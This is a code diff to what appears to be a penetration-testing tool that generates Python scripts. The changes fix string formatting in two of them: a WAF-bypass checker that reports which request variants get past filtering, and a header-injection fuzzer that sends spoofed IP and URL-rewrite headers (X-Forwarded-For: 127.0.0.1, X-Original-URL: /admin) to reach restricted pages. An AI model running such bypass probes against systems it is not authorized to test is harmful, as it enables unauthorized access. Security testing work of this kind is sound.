@@ -1125,7 +1125,7 @@ for i, (name, variant) in enumerate(variants.items()):
     rc, sz = resp.split('|') if '|' in resp else (resp,'?')
     status = "PASS" if rc not in ('403','406','419','429','503') and sz != '0' else "BLOCK"
     if status == "PASS": hits.append((name, variant, rc, sz))
-    print(f"  [{{status}}] {{name:<20}} HTTP {{rc}}  Size {{sz}}")
+    print("  [%s] %-20s HTTP %s  Size %s" % (status, name, rc, sz))
     time.sleep(0.3)
 
 print(f"\\n=== RESULTS: {{len(hits)}} bypasses found ===")
@@ -1298,26 +1298,26 @@ except Exception as e:
 PYEOF"""
         elif mode == "fuzz":
             return f"""python3 - <<'PYEOF'
-import subprocess, itertools
+import subprocess
 TARGET = {target}
 FUZZ_HEADERS = [
-    {{'X-Forwarded-For': '127.0.0.1'}},
-    {{'X-Real-IP': '127.0.0.1'}},
-    {{'X-Originating-IP': '127.0.0.1'}},
-    {{'X-Custom-IP-Authorization': '127.0.0.1'}},
-    {{'X-Forwarded-Host': 'localhost'}},
-    {{'X-Original-URL': '/admin'}},
-    {{'X-Rewrite-URL': '/admin'}},
+    ("X-Forwarded-For",          "127.0.0.1"),
+    ("X-Real-IP",                "127.0.0.1"),
+    ("X-Originating-IP",         "127.0.0.1"),
+    ("X-Custom-IP-Authorization","127.0.0.1"),
+    ("X-Forwarded-Host",         "localhost"),
+    ("X-Original-URL",           "/admin"),
+    ("X-Rewrite-URL",            "/admin"),
 ]
 print("=== HEADER INJECTION FUZZ ===")
-for hdrs in FUZZ_HEADERS:
-    hdr_args = []
-    for k,v in hdrs.items(): hdr_args += ['-H', f'{{k}}: {{v}}']
-    r = subprocess.run(['curl','-s','-o','/dev/null','-w','%{{http_code}}|%{{size_download}}',
-        '-m','8','--insecure',TARGET]+hdr_args, capture_output=True, text=True)
+for hdr_name, hdr_val in FUZZ_HEADERS:
+    r = subprocess.run(
+        ['curl','-s','-o','/dev/null','-w','%{{http_code}}|%{{size_download}}',
+         '-m','8','--insecure','-H', hdr_name+': '+hdr_val, TARGET],
+        capture_output=True, text=True)
     code,sz = r.stdout.strip().split('|') if '|' in r.stdout else (r.stdout,'?')
     flag = " *** INTERESTING ***" if code in ('200','301','302') else ""
-    print(f"  {{list(hdrs.keys())[0]}: {{list(hdrs.values())[0]:<20}} HTTP {{code}}  Size {{sz}}{{flag}}")
+    print("  %-35s HTTP %s  Size %s%s" % (hdr_name+': '+hdr_val, code, sz, flag))
 PYEOF"""
         else:
             return f"echo 'mitmproxy_scan: unknown mode {mode}'"
